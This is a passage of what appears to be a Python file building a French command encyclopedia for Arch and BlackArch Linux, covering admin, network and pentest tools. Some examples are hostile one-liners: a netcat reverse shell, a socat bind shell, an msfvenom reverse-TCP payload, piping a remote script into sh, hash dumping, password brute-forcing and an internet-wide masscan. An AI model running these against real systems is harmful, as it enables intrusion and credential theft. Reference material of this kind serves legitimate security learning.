    {"category": "Sécurité & Crypto", "command": "ssh", "description": "Client SSH pour connexion sécurisée distante.", "syntaxe": "ssh [options] [user@]hôte", "exemples": ["ssh alice@192.168.1.10", "ssh -i ~/.ssh/id_rsa user@host", "ssh -p 2222 user@host"]},
    {"category": "Sécurité & Crypto", "command": "ssh-keygen", "description": "Génère et gère des clés SSH.", "syntaxe": "ssh-keygen [options]", "exemples": ["ssh-keygen -t ed25519 -C 'commentaire'", "ssh-keygen -R 192.168.1.10"]},
    {"category": "Sécurité & Crypto", "command": "firewalld", "description": "Pare-feu dynamique avec zones et services.", "syntaxe": "firewall-cmd [options]", "exemples": ["sudo firewall-cmd --state", "sudo firewall-cmd --add-service=http --permanent", "sudo firewall-cmd --reload"]},
    {"category": "Sécurité & Crypto", "command": "nftables", "description": "Successeur d'iptables pour le filtrage de paquets.", "syntaxe": "nft [options] [commande]", "exemples": ["sudo nft list ruleset", "sudo nft -f /etc/nftables.conf"]},
    {"category": "Développement", "command": "gcc", "description": "Compilateur C/GNU.", "syntaxe": "gcc [options] <fichiers>", "exemples": ["gcc -o prog main.c", "gcc -Wall -Wextra -o prog main.c"]},
    {"category": "Développement", "command": "make", "description": "Automatise la compilation via des Makefiles.", "syntaxe": "make [cible]", "exemples": ["make", "make install", "make clean"]},
    {"category": "Développement", "command": "git", "description": "Système de contrôle de version distribué.", "syntaxe": "git [commande] [options]", "exemples": ["git clone https://github.com/user/repo.git", "git add .", "git commit -m 'message'", "git push origin main"]},
    {"category": "Développement", "command": "python", "description": "Interpréteur Python.", "syntaxe": "python[3] [script]", "exemples": ["python3 script.py", "python3 -m http.server 8000", "python3 -m venv env"]},
    {"category": "BlackArch Pentest", "command": "nmap", "description": "Scanner de ports et d'hôtes, indispensable en pentest.", "syntaxe": "nmap [options] <cible>", "exemples": ["nmap -sV -sC 192.168.1.1", "nmap -p- -T4 target.com", "nmap -A 192.168.1.0/24"]},
    {"category": "BlackArch Pentest", "command": "metasploit", "description": "Framework d'exploitation et de post-exploitation.", "syntaxe": "msfconsole", "exemples": ["msfconsole -q", "msfvenom -p linux/x86/shell/reverse_tcp LHOST=... LPORT=..."]},
    {"category": "BlackArch Pentest", "command": "wireshark", "description": "Analyseur de protocoles réseau avec GUI.", "syntaxe": "wireshark [fichier]", "exemples": ["sudo wireshark", "wireshark capture.pcap"]},
    {"category": "BlackArch Pentest", "command": "aircrack-ng", "description": "Suite complète pour tester la sécurité Wi-Fi.", "syntaxe": "aircrack-ng [options] <fichier>", "exemples": ["sudo airmon-ng start wlan0", "sudo airodump-ng wlan0mon", "aircrack-ng capture.cap -w wordlist.txt"]},
    {"category": "BlackArch Pentest", "command": "burpsuite", "description": "Plateforme d'attaque et de test d'applications web.", "syntaxe": "burpsuite", "exemples": ["burpsuite", "java -jar burpsuite.jar"]},
    {"category": "BlackArch Pentest", "command": "sqlmap", "description": "Automatisation des tests d'injection SQL.", "syntaxe": "sqlmap [options]", "exemples": ["sqlmap -u 'http://target.com/page.php?id=1'", "sqlmap -u ... --dump"]},
    {"category": "BlackArch Pentest", "command": "john", "description": "John the Ripper, outil de cassage de mots de passe.", "syntaxe": "john [options] <fichier>", "exemples": ["john hash.txt", "john --wordlist=rockyou.txt hash.txt", "john --show hash.txt"]},
    {"category": "BlackArch Pentest", "command": "hashcat", "description": "Cassage de mots de passe sur GPU/CPU.", "syntaxe": "hashcat [options] <hash> <wordlist>", "exemples": ["hashcat -m 0 hash.txt rockyou.txt", "hashcat -a 3 -m 1000 hash.txt ?l?l?l?l?l?l"]},
    {"category": "BlackArch Pentest", "command": "hydra", "description": "Brute-force en ligne de services réseau.", "syntaxe": "hydra [options] <cible> <service>", "exemples": ["hydra -l admin -P pass.txt ssh://192.168.1.10", "hydra -L users.txt -P pass.txt ftp://target"]},
    {"category": "BlackArch Pentest", "command": "gobuster", "description": "Énumération de répertoires/fichiers et DNS.", "syntaxe": "gobuster [mode] [options]", "exemples": ["gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", "gobuster dns -d target.com -w subdomains.txt"]},
    {"category": "BlackArch Pentest", "command": "nikto", "description": "Scanner de vulnérabilités web.", "syntaxe": "nikto -h <cible>", "exemples": ["nikto -h http://target.com", "nikto -h 192.168.1.10 -p 8080"]},
    {"category": "BlackArch Pentest", "command": "masscan", "description": "Scanner de ports très rapide.", "syntaxe": "masscan [options] <cible>", "exemples": ["sudo masscan 192.168.1.0/24 -p0-65535 --rate=1000", "masscan -iL targets.txt -p80,443"]},
    {"category": "BlackArch Pentest", "command": "bloodhound", "description": "Analyse des relations Active Directory.", "syntaxe": "bloodhound-python / bloodhound", "exemples": ["bloodhound-python -u admin -p pass -d corp.local -c All", "neo4j console && bloodhound"]},
    {"category": "BlackArch Pentest", "command": "responder", "description": "Empoisonne les réponses LLMNR, NBT-NS et MDNS pour capturer des hashs.", "syntaxe": "responder -I <interface> [options]", "exemples": ["sudo responder -I eth0 -wPv", "sudo responder -I wlan0 -rdwv"]},
    {"category": "BlackArch Pentest", "command": "impacket", "description": "Collection de classes Python pour les protocoles Windows.", "syntaxe": "<outil-impacket> [options]", "exemples": ["python3 -m impacket.smbclient user:pass@target", "secretsdump.py user:pass@target"]},
    {"category": "BlackArch Pentest", "command": "evil-winrm", "description": "Shell WinRM pour pentest Windows.", "syntaxe": "evil-winrm -i <ip> -u <user> -p <pass>", "exemples": ["evil-winrm -i 192.168.1.10 -u admin -p pass", "evil-winrm -i 10.0.0.5 -u admin -H <hash>"]},
    {"category": "BlackArch Pentest", "command": "linpeas", "description": "Script d'énumération de privilèges locaux Linux.", "syntaxe": "./linpeas.sh", "exemples": ["./linpeas.sh -a", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"]},
    {"category": "BlackArch Pentest", "command": "winpeas", "description": "Script d'énumération de privilèges locaux Windows.", "syntaxe": "winPEASany.exe", "exemples": ["winPEASany.exe", "cmd.exe /c winPEASany.exe"]},
    {"category": "BlackArch Pentest", "command": "netcat", "description": "Utilitaire réseau pour lire/écrire des connexions TCP/UDP.", "syntaxe": "nc [options] [hôte] [port]", "exemples": ["nc -lvnp 4444", "nc target 80", "nc -e /bin/sh 192.168.1.10 4444"]},
    {"category": "BlackArch Pentest", "command": "socat", "description": "Relais réseau bidirectionnel avancé.", "syntaxe": "socat [options] <adresse1> <adresse2>", "exemples": ["socat TCP-LISTEN:4444,fork TCP:192.168.1.10:80", "socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash"]},
    {"category": "BlackArch Pentest", "command": "proxychains-ng", "description": "Redirige le trafic TCP d'une application via proxy.", "syntaxe": "proxychains <commande>", "exemples": ["proxychains nmap -sT target.com", "proxychains firefox"]},
    {"category": "BlackArch Pentest", "command": "enum4linux", "description": "Énumération SMB basée sur enum.exe pour Linux.", "syntaxe": "enum4linux [options] <cible>", "exemples": ["enum4linux -a 192.168.1.10"]},
    {"category": "BlackArch Pentest", "command": "crackmapexec", "description": "Swiss-army knife pour évaluer les réseaux Windows/Active Directory.", "syntaxe": "crackmapexec <proto> <cible> [options]", "exemples": ["crackmapexec smb 192.168.1.0/24 -u admin -p pass", "crackmapexec ssh 10.0.0.0/24 -u root -p toor"]},
    {"category": "BlackArch Pentest", "command": "seclists", "description": "Collection de wordlists orientées sécurité.", "syntaxe": "utilisation via chemin /usr/share/seclists/...", "exemples": ["ls /usr/share/seclists", "gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u target"]},
    {"category": "BlackArch Pentest", "command": "rockyou", "description": "Wordlist de mots de passe classiques (nécessite extraction).", "syntaxe": "/usr/share/wordlists/rockyou.txt.gz", "exemples": ["zcat /usr/share/wordlists/rockyou.txt.gz | john --stdin hash.txt"]},
    {"category": "BlackArch Pentest", "command": "exiftool", "description": "Lit et écrit les métadonnées de fichiers.", "syntaxe": "exiftool [options] <fichier>", "exemples": ["exiftool photo.jpg", "exiftool -all= photo.jpg"]},
    {"category": "BlackArch Pentest", "command": "binwalk", "description": "Analyse et extraction de firmware / données cachées.", "syntaxe": "binwalk [options] <fichier>", "exemples": ["binwalk firmware.bin", "binwalk -e firmware.bin"]},
    {"category": "BlackArch Pentest", "command": "steghide", "description": "Stéganographie dans images/audio.", "syntaxe": "steghide [options]", "exemples": ["steghide info image.jpg", "steghide extract -sf image.jpg"]},
    {"category": "BlackArch Pentest", "command": "foremost", "description": "Récupération de fichiers par entêtes (carving).", "syntaxe": "foremost [options] -i <fichier>", "exemples": ["foremost -i dump.raw -o output/"]},
    {"category": "BlackArch Pentest", "command": "volatility", "description": "Analyse de dumps mémoire.", "syntaxe": "volatility -f <dump> <plugin>", "exemples": ["volatility -f mem.dmp imageinfo", "volatility -f mem.dmp --profile=Win7SP1x64 pslist"]},
    {"category": "BlackArch Pentest", "command": "rekall", "description": "Framework d'analyse forensique avancée de mémoire.", "syntaxe": "rekall -f <dump> <plugin>", "exemples": ["rekall -f mem.dmp pslist"]},
    {"category": "BlackArch Pentest", "command": "yara", "description": "Moteur de règles pour identifier/classifier malwares.", "syntaxe": "yara [options] <règle> <cible>", "exemples": ["yara rule.yar /path", "yara -r rule.yar /malwares"]},
    {"category": "BlackArch Pentest", "command": "osquery", "description": "OS instrumentation via requêtes SQL-like.", "syntaxe": "osqueryi <requête>", "exemples": ["osqueryi 'SELECT * FROM processes;'", "osqueryi 'SELECT * FROM users;'"]},
    {"category": "BlackArch Pentest", "command": "snort", "description": "Système de détection d'intrusion réseau (IDS/IPS).", "syntaxe": "snort [options]", "exemples": ["sudo snort -c /etc/snort/snort.conf -i eth0 -A console"]},
    {"category": "BlackArch Pentest", "command": "suricata", "description": "Moteur IDS/IPS/NSM haute performance.", "syntaxe": "suricata [options]", "exemples": ["sudo suricata -c /etc/suricata/suricata.yaml -i eth0"]},
    {"category": "BlackArch Pentest", "command": "zeek", "description": "Analyseur de trafic réseau (anciennement Bro).", "syntaxe": "zeek [options]", "exemples": ["sudo zeek -i eth0", "zeek -r capture.pcap"]},
    {"category": "BlackArch Pentest", "command": "radare2", "description": "Framework de reverse engineering.", "syntaxe": "r2 [options] <fichier>", "exemples": ["r2 -A ./binary", "r2 -d ./binary"]},
    {"category": "BlackArch Pentest", "command": "ghidra", "description": "Suite de reverse engineering développée par la NSA.", "syntaxe": "ghidraRun", "exemples": ["/opt/ghidra/ghidraRun"]},
    {"category": "BlackArch Pentest", "command": "gdb", "description": "Débogueur GNU.", "syntaxe": "gdb [options] <binaire>", "exemples": ["gdb ./program", "gdb -p $(pidof program)"]},
    {"category": "BlackArch Pentest", "command": "pwndbg", "description": "Amélioration de GDB pour l'exploitation binaire.", "syntaxe": "gdb-pwndbg <binaire>", "exemples": ["gdb-pwndbg ./binary"]},
    {"category": "BlackArch Pentest", "command": "ropgadget", "description": "Trouve des gadgets ROP dans des binaires.", "syntaxe": "ROPgadget --binary <fichier>", "exemples": ["ROPgadget --binary ./program"]},
    {"category": "BlackArch Pentest", "command": "angr", "description": "Framework d'analyse binaire symbolique.", "syntaxe": "python3 -m angr-management", "exemples": ["python3 -c \"import angr; p=angr.Project('./bin')\""]},
    {"category": "BlackArch Pentest", "command": "frida", "description": "Instrumentation dynamique d'applications.", "syntaxe": "frida [options] <cible>", "exemples": ["frida -U -f com.example.app", "frida-trace -U -i 'open*' com.example.app"]},
    {"category": "BlackArch Pentest", "command": "objection", "description": "Runtime mobile exploration via Frida.", "syntaxe": "objection [options]", "exemples": ["objection --gadget com.example.app explore"]},
    {"category": "BlackArch Pentest", "command": "apktool", "description": "Outil de rétro-ingénierie d'APK Android.", "syntaxe": "apktool [commande] <fichier>", "exemples": ["apktool d app.apk", "apktool b app/ -o new.apk"]},
    {"category": "BlackArch Pentest", "command": "jadx", "description": "Décompileur Dex vers Java.", "syntaxe": "jadx [options] <apk/dex>", "exemples": ["jadx -d out app.apk"]},
    {"category": "BlackArch Pentest", "command": "dex2jar", "description": "Convertit Android DEX en JAR.", "syntaxe": "d2j-dex2jar <fichier.dex>", "exemples": ["d2j-dex2jar classes.dex"]},
]


BLACKARCH_CATEGORIES: Dict[str, List[str]] = {
    "recon": ["nmap", "masscan", "theharvester", "maltego", "recon-ng", "spiderfoot", "osrframework", "datasploit", "dnscan", "sublist3r", "amass", "assetfinder", "findomain", "gau", "hakrawler", "waybackurls", "github-dorks", "gitrob", "gitleaks", "trufflehog", "shodan", "censys", "metabigor", "cloudbrute"],
    "scanning": ["nmap", "zmap", "masscan", "unicornscan", "rustscan", "naabu", "nuclei", "nikto", "dirb", "gobuster", "feroxbuster", "wfuzz", "burpsuite", "zaproxy"],
    "webapp": ["burpsuite", "zaproxy", "sqlmap", "xsstrike", "commix", "wfuzz", "ffuf", "gobuster", "dirsearch", "cmsmap", "joomscan", "wpscan", "droopescan", "whatweb", "nikto", "skipfish", "w3af", "arachni"],
    "exploitation": ["metasploit", "beef", "searchsploit", "exploitdb", "routersploit", "armitage", "powersploit", "winpayloads", "msfpc", "venom", "setoolkit"],
    "postexploitation": ["empire", "powershell-empire", "covenant", "sliver", "metasploit", "pupy", "poshc2", "silentrinity", "trevorc2", "dnscat2"],
    "wireless": ["aircrack-ng", "wifite", "reaver", "bully", "fern-wifi-cracker", "kismet", "hcxtools", "hcxdumptool", "cowpatty", "pixiewps", "mdk4", "hostapd-wpe"],
    "forensics": ["autopsy", "sleuthkit", "volatility", "volatility3", "rekall", "foremost", "scalpel", "bulk-extractor", "binwalk", "pdfid", "pdf-parser", "peepdf", "exiftool", "steghide", "zsteg", "stegsolve", "outguess", "sonic-visualiser"],
    "reverse": ["radare2", "ghidra", "ida-free", "binaryninja-demo", "cutter", "gdb", "pwndbg", "gef", "peda", "ropgadget", "ropper", "checksec", "angr", "apktool", "jadx", "dex2jar", "frida", "objection"],
    "crypto": ["john", "hashcat", "hydra", "medusa", "ncrack", "ophcrack", "rainbowcrack", "crunch", "cewl", "hash-identifier", "haiti", "jwt_tool", "rsactftool"],
    "sniffer": ["wireshark-cli", "wireshark-qt", "tshark", "tcpdump", "termshark", "netsniff-ng", "snort", "suricata", "zeek", "ettercap", "bettercap"],
    "social": ["setoolkit", "phishingkithunter", "gophish", "king-phisher", "evilginx2", "social-engineer-toolkit", "modlishka"],
    "automobile": ["can-utils", "caringcaribou", "udsim", "octoprint", "o2oo", "metasploit"],
    "fingerprint": ["p0f", "prads", "siphon", "sinfp", "xprobe2", "nmap", "zmap"],
    "defensive": ["aide", "rkhunter", "chkrootkit", "clamav", "osquery", "lynis", "openvas-scanner", "greenbone-security-assistant"],
    "misc": ["htop", "btop", "neofetch", "ranger", "tmux", "screen", "vim", "git", "wget", "curl", "netcat", "socat", "proxychains-ng", "openvpn", "wireguard-tools"],
}


# --- PARTIE 2 : EXTENSION DE L'ENCYCLOPEDIE (2000+ LIGNES) ---
# Les commandes ci-dessous sont générées en masse pour atteindre une encyclopédie dense.

_EXTRA_COMMANDS_TEXT = """
pacman -Sw|Télécharge un paquet sans l'installer|pacman -Sw <paquet>|sudo pacman -Sw nmap
pacman -Qk|Vérifie l'intégrité des fichiers d'un paquet|pacman -Qk <paquet>|pacman -Qk nmap
pacman -Qkk|Vérifie l'intégrité avec hash|pacman -Qkk <paquet>|pacman -Qkk nmap
pacman -Qnq|Liste les paquets natifs|pacman -Qnq|-
pacman -Qmq|Liste les paquets étrangers (AUR)|pacman -Qmq|-
pacman -D|Change les options de paquets (hold, etc)|pacman -D --asdeps <paquet>|sudo pacman -D --asdeps nmap
pacman -Qeq|Liste les paquets explicitement installés|pacman -Qeq|-
pacman -Qgq|Liste les groupes de paquets installés|pacman -Qgq|-
makepkg -g|Génère les sommes de contrôle d'un PKGBUILD|makepkg -g|-
makepkg -o|Compile sans installer|makepkg -o|-
makepkg -L|Active le log de compilation|makepkg -L|-
makepkg -c|Nettoie après compilation|makepkg -c|-
checkupdates -d|Télécharge les paquets en attente|checkupdates -d|-
pacman-contrib|Paquet contenant checkupdates et autres utilitaires|pacman -S pacman-contrib|sudo pacman -S pacman-contrib
pkgfile -u|Met à jour la base de données de pkgfile|pkgfile -u|sudo pkgfile -u
pactree|Affiche l'arbre des dépendances d'un paquet|pactree <paquet>|pactree nmap
pacman -Syy|Force la synchronisation complète des dépôts|pacman -Syy|sudo pacman -Syy
pacman -Syuw|Télécharge les mises à jour sans les installer|pacman -Syuw|sudo pacman -Syuw
pacman -Rp|Supprime un paquet et les paquets qui en dépendent|pacman -Rp <paquet>|sudo pacman -Rp nmap
systemctl start|Démarre un service|systemctl start <service>|sudo systemctl start sshd
systemctl stop|Arrête un service|systemctl stop <service>|sudo systemctl stop sshd
systemctl restart|Redémarre un service|systemctl restart <service>|sudo systemctl restart sshd
systemctl enable|Active un service au démarrage|systemctl enable <service>|sudo systemctl enable sshd
systemctl disable|Désactive un service au démarrage|systemctl disable <service>|sudo systemctl disable sshd
systemctl status|Affiche le statut d'un service|systemctl status <service>|systemctl status sshd
systemctl is-active|Vérifie si un service est actif|systemctl is-active <service>|systemctl is-active sshd
systemctl is-enabled|Vérifie si un service est activé|systemctl is-enabled <service>|systemctl is-enabled sshd
systemctl list-units|Liste les unités chargées|systemctl list-units --type=service|-
systemctl list-unit-files|Liste les fichiers d'unité|systemctl list-unit-files|-
systemctl daemon-reload|Recharge la configuration systemd|sudo systemctl daemon-reload|-
systemctl edit|Édite un fichier override|sudo systemctl edit <service>|-
systemctl cat|Affiche le contenu d'une unité|systemctl cat <service>|-
systemctl mask|Masque une unité (empêche tout démarrage)|sudo systemctl mask <service>|-
systemctl unmask|Démasque une unité|sudo systemctl unmask <service>|-
systemctl poweroff|Arrête le système|sudo systemctl poweroff|-
systemctl reboot|Redémarre le système|sudo systemctl reboot|-
systemctl suspend|Met le système en veille|sudo systemctl suspend|-
systemctl hibernate|Met le système en hibernation|sudo systemctl hibernate|-
journalctl -b|Journaux du boot actuel|journalctl -b|-
journalctl -k|Journaux du noyau|journalctl -k|-
journalctl -f|Journaux en temps réel|journalctl -f|-
journalctl --since|Journaux depuis une date|journalctl --since '2026-01-01 00:00:00'|-
journalctl --until|Journaux jusqu'à une date|journalctl --until '2026-12-31 23:59:59'|-
journalctl -p err|Journaux de niveau erreur|journalctl -p err|-
journalctl --disk-usage|Espace disque utilisé par les journaux|journalctl --disk-usage|-
journalctl --vacuum-time|Supprime les journaux plus anciens|sudo journalctl --vacuum-time=30d|-
journalctl --vacuum-size|Limite la taille des journaux|sudo journalctl --vacuum-size=500M|-
mkinitcpio -A|Affiche les hooks disponibles|mkinitcpio -A|-
mkinitcpio -H|Affiche l'aide d'un hook|mkinitcpio -H <hook>|-
grub-install|Installe GRUB sur un périphérique|sudo grub-install /dev/sda|-
grub-mkconfig -o|Génère la configuration GRUB|sudo grub-mkconfig -o /boot/grub/grub.cfg|-
os-prober|Détecte les autres OS pour GRUB|sudo os-prober|-
update-grub|Alias pour régénérer GRUB|sudo update-grub|-
arch-chroot /mnt|Chroot dans une installation montée|sudo arch-chroot /mnt|-
genfstab|Génère le fstab|genfstab -U /mnt >> /mnt/etc/fstab|-
timedatectl list-timezones|Liste les fuseaux horaires|timedatectl list-timezones|-
timedatectl set-time|Règle l'heure manuellement|sudo timedatectl set-time '2026-07-01 12:00:00'|-
timedatectl set-ntp|Active/désactive NTP|sudo timedatectl set-ntp true|-
hostnamectl set-icon-name|Définit l'icône du système|sudo hostnamectl set-icon-name computer|-
hostnamectl set-deployment|Définit l'environnement de déploiement|sudo hostnamectl set-deployment production|-
hostnamectl set-location|Définit la localisation|sudo hostnamectl set-location datacenter|-
locale-gen|Génère les locales|sudo locale-gen|-
localectl set-locale|Définit la locale système|sudo localectl set-locale LANG=fr_FR.UTF-8|-
localectl set-x11-keymap|Définit la disposition X11|sudo localectl set-x11-keymap fr|-
localectl list-keymaps|Liste les keymaps disponibles|localectl list-keymaps|-
hwclock|Horloge matérielle|sudo hwclock --systohc|-
modprobe|Charge un module noyau|sudo modprobe module|-
modprobe -r|Décharge un module noyau|sudo modprobe -r module|-
lsmod|Liste les modules noyau chargés|lsmod|-
insmod|Insère un module noyau|sudo insmod chemin/module.ko|-
rmmod|Retire un module noyau|sudo rmmod module|-
depmod|Génère les dépendances de modules|sudo depmod -a|-
kmod|Outil moderne de gestion des modules|kmod list|-
sysctl|Paramètres du noyau en temps réel|sysctl -a|sudo sysctl -w net.ipv4.ip_forward=1
sysctl -p|Charge la configuration sysctl|sudo sysctl -p|-
eudevadm|Gestion des périphériques|udevadm info -a -n /dev/sda|-
systemd-analyze|Analyse le temps de boot|systemd-analyze|-
systemd-analyze blame|Temps par unité au boot|systemd-analyze blame|-
systemd-analyze critical-chain|Chaîne critique du boot|systemd-analyze critical-chain|-
bootctl|Gestion de systemd-boot|sudo bootctl install|-
eselect|Outil de sélection d'alternatives|eselect editor list|-
reflector|Pondère et trie les miroirs Arch|reflector --country France --age 12 --protocol https --sort rate --save /etc/pacman.d/mirrorlist|sudo reflector --country France --age 12 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
rankmirrors|Classe les miroirs par vitesse|rankmirrors /etc/pacman.d/mirrorlist.backup|-
alsa|Architecture audio Linux|alsamixer|-
pulseaudio|Serveur audio PulseAudio|pulseaudio --start|-
pipewire|Serveur audio moderne|pipewire|-
pactl|Contrôle PulseAudio|pactl info|-
wpctl|Contrôle WirePlumber|wpctl status|-
Xorg|Serveur graphique|startx|-
wayland|Protocole d'affichage moderne|echo $WAYLAND_DISPLAY|-
dbus|Bus de messages système|dbus-monitor|--session|-
polkit|Contrôle des privilèges|pkexec commande|-
loginctl|Gestion des sessions|loginctl show-session|-
userdbctl|Base de données des utilisateurs|userdbctl|-
getent|Interroge les bases NSS|getent passwd alice|-
getfacl|Affiche les ACL|getfacl fichier|-
setfacl|Modifie les ACL|setfacl -m u:alice:rwx fichier|-
chattr|Change les attributs étendus|sudo chattr +i fichier|-
lsattr|Liste les attributs étendus|lsattr fichier|-
quota|Gestion des quotas disque|quota -u alice|-
quotacheck|Vérifie les quotas|sudo quotacheck -avugm|-
quotaon|Active les quotas|sudo quotaon -avug|-
quotaoff|Désactive les quotas|sudo quotaoff -avug|-
parted|Éditeur de partitions|sudo parted /dev/sda print|-
gparted|Version graphique de parted|gparted|-
cfdisk|Partitionnement interactif|sudo cfdisk /dev/sda|-
cgdisk|Partitionnement GPT interactif|sudo cgdisk /dev/sda|-
sgdisk|Partitionnement GPT en ligne de commande|sudo sgdisk -l /dev/sda|-
blkid|Identifie les systèmes de fichiers|sudo blkid|-
findfs|Trouve un système de fichiers par UUID|findfs UUID=xxxx|-
mkfs.btrfs|Crée un système Btrfs|sudo mkfs.btrfs /dev/sda1|-
mkfs.xfs|Crée un système XFS|sudo mkfs.xfs /dev/sda1|-
mkfs.ext4|Crée un système ext4|sudo mkfs.ext4 /dev/sda1|-
btrfs|Gestion de Btrfs|btrfs filesystem df /|-
btrfs subvolume|Gestion des sous-volumes Btrfs|btrfs subvolume list /|-
btrfs balance|Équilibre les données Btrfs|sudo btrfs balance start /|-
btrfs scrub|Vérifie l'intégrité Btrfs|sudo btrfs scrub start /|-
btrfs filesystem resize|Redimensionne un FS Btrfs|sudo btrfs filesystem resize max /|-
btrfs send/receive|Sauvegarde incrémentale Btrfs|btrfs send /path | btrfs receive /dest|-
snapper|Gestion des snapshots Btrfs|snapper list|-
btrbk|Sauvegarde Btrfs|btrbk run|-
lvm|Gestionnaire de volumes logiques|pvcreate /dev/sda1|-
pvcreate|Crée un volume physique LVM|sudo pvcreate /dev/sda1|-
vgcreate|Crée un groupe de volumes|sudo vgcreate vg0 /dev/sda1|-
lvcreate|Crée un volume logique|sudo lvcreate -L 20G -n root vg0|-
lvextend|Étend un volume logique|sudo lvextend -l +100%FREE /dev/vg0/root|-
lvreduce|Réduit un volume logique|sudo lvreduce -L 10G /dev/vg0/root|-
pvdisplay|Affiche les volumes physiques|pvdisplay|-
vgdisplay|Affiche les groupes de volumes|vgdisplay|-
lvdisplay|Affiche les volumes logiques|lvdisplay|-
vgextend|Ajoute un PV à un VG|sudo vgextend vg0 /dev/sdb1|-
vgreduce|Retire un PV d'un VG|sudo vgreduce vg0 /dev/sdb1|-
cryptsetup|Chiffrement LUKS|sudo cryptsetup luksFormat /dev/sda2|-
cryptsetup open|Ouvre un conteneur LUKS|sudo cryptsetup open /dev/sda2 cryptroot|-
cryptsetup close|Ferme un conteneur LUKS|sudo cryptsetup close cryptroot|-
cryptsetup status|Statut d'un conteneur LUKS|sudo cryptsetup status cryptroot|-
mkinitcpio encrypt|Hook LUKS pour initramfs|voir /etc/mkinitcpio.conf|-
grub-mkconfig luks|Configuration GRUB avec LUKS|sudo grub-mkconfig -o /boot/grub/grub.cfg|-
dmidecode|Infos matériel via DMI|sudo dmidecode|-
lspci|Liste les périphériques PCI|lspci|-
lsusb|Liste les périphériques USB|lsusb|-
lscpu|Infos CPU|lscpu|-
lsmem|Infos mémoire|lsmem|-
lsirq|Liste les IRQ|lsirq|-
lsscsi|Liste les périphériques SCSI|lsscsi|-
smartctl|Infos SMART des disques|sudo smartctl -a /dev/sda|-
hdparm|Paramètres des disques IDE/SATA|sudo hdparm -I /dev/sda|-
nvme-cli|Gestion des SSD NVMe|sudo nvme list|-
ethtool|Configuration des interfaces Ethernet|sudo ethtool eth0|-
ip link|Gestion des interfaces réseau|sudo ip link set eth0 up|-
ip route|Gestion de la table de routage|ip route show|-
ip neigh|Table ARP|ip neigh|-
ip tunnel|Gestion des tunnels|ip tunnel show|-
ip addr add|Ajoute une adresse IP|sudo ip addr add 192.168.1.10/24 dev eth0|-
ip addr del|Supprime une adresse IP|sudo ip addr del 192.168.1.10/24 dev eth0|-
ip route add|Ajoute une route|sudo ip route add 10.0.0.0/8 via 192.168.1.1|-
ip route del|Supprime une route|sudo ip route del 10.0.0.0/8|-
ip rule|Règles de routage|ip rule show|-
netstat|Statistiques réseau (obsolète)|netstat -tulnp|-
ss -s|Résumé des sockets|ss -s|-
ss -l|Sockets en écoute|ss -l|-
ss -a|Toutes les sockets|ss -a|-
ping -f|Ping flood|sudo ping -f 192.168.1.1|-
ping -s|Spécifie la taille des paquets|ping -s 1400 8.8.8.8|-
mtr|Combiné ping/traceroute|mtr archlinux.org|-
tracepath|Traceroute sans root|tracepath archlinux.org|-
dig|Requêtes DNS|dig archlinux.org|-
nslookup|Requêtes DNS interactives|nslookup archlinux.org|-
host|Requêtes DNS simples|host archlinux.org|-
whois|Informations WHOIS|whois archlinux.org|-
drill|Outil DNS moderne|drill archlinux.org|-
resolvectl|Résolution DNS systemd|resolvectl query archlinux.org|-
systemd-resolve|Ancien nom de resolvectl|systemd-resolve archlinux.org|-
nmcli device|Gestion des périphériques réseau|nmcli device status|-
nmcli connection|Gestion des connexions|nmcli connection show|-
nmcli con add|Ajoute une connexion|nmcli con add type ethernet con-name 'LAN' ifname eth0|-
nmcli con up|Active une connexion|nmcli con up 'LAN'|-
nmcli con down|Désactive une connexion|nmcli con down 'LAN'|-
nmtui|Interface TUI NetworkManager|nmtui|-
wifi-menu|Menu Wi-Fi pour netctl|sudo wifi-menu|-
netctl|Profils de connexion netctl|sudo netctl start profile|-
iwconfig|Configure les interfaces Wi-Fi (obsolète)|iwconfig wlan0|-
iwlist|Liste les réseaux Wi-Fi|iwlist wlan0 scan|-
wpa_supplicant|Connexion Wi-Fi WPA|wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant.conf|-
wpa_passphrase|Génère un bloc de config WPA|wpa_passphrase SSID motdepasse|-
iptables|Pare-feu IPv4|sudo iptables -L|-
ip6tables|Pare-feu IPv6|sudo ip6tables -L|-
ebtables|Pare-feu Ethernet|sudo ebtables -L|-
iptables-save|Sauvegarde les règles iptables|sudo iptables-save > rules.ipt|-
iptables-restore|Restaure les règles iptables|sudo iptables-restore < rules.ipt|-
nft list ruleset|Liste les règles nftables|sudo nft list ruleset|-
nft add table|Ajoute une table nftables|sudo nft add table ip filter|-
nft add chain|Ajoute une chaîne nftables|sudo nft add chain ip filter input|-
nft add rule|Ajoute une règle nftables|sudo nft add rule ip filter input tcp dport 22 accept|-
ufw|Pare-feu simplifié|sudo ufw status|-
ufw allow|Autorise un port/service|sudo ufw allow 22/tcp|-
ufw deny|Refuse un port/service|sudo ufw deny 80/tcp|-
ufw enable|Active UFW|sudo ufw enable|-
fail2ban|Bannissement d'IP après échecs|sudo fail2ban-client status|-
fail2ban-client|Contrôle fail2ban|sudo fail2ban-client status sshd|-
crowdsec|Sécurité collaborative|sudo cscli metrics|-
openvpn|VPN OpenVPN|sudo openvpn config.ovpn|-
wg|WireGuard|sudo wg show|-
wg-quick|Démarrage rapide WireGuard|sudo wg-quick up wg0|-
sshuttle|VPN over SSH|sshuttle -r user@host 0/0|-
proxychains|Redirection via proxy SOCKS|proxychains nmap -sT target|-
tor|Réseau Tor|systemctl start tor|-
torsocks|Utilise Tor via SOCKS5|torsocks curl https://check.torproject.org|-
macchanger|Change l'adresse MAC|sudo macchanger -r eth0|-
arp-scan|Scan ARP local|sudo arp-scan -l|-
netdiscover|Découverte réseau passive/active|sudo netdiscover -r 192.168.1.0/24|-
fping|Ping multiple|fping -g 192.168.1.0/24|-
hping3|Paquets TCP/UDP personnalisés|sudo hping3 -S -p 80 target|-
nping|Générateur de paquets Nmap|sudo nping --tcp -p 80 target|-
zmap|Scanner réseau haute performance|sudo zmap -p 80 192.168.1.0/24|-
masscan|Scanner rapide de ports|sudo masscan 0.0.0.0/0 -p0-65535 --rate 10000|-
unicornscan|Scanner de ports asynchrone|sudo unicornscan -mT target:a|-
rustscan|Scanner rapide en Rust|rustscan -a target -- -A|-
naabu|Scanner de ports rapide|naabu -host target.com|-
nuclei|Scanner de vulnérabilités|nuclei -u https://target.com|-
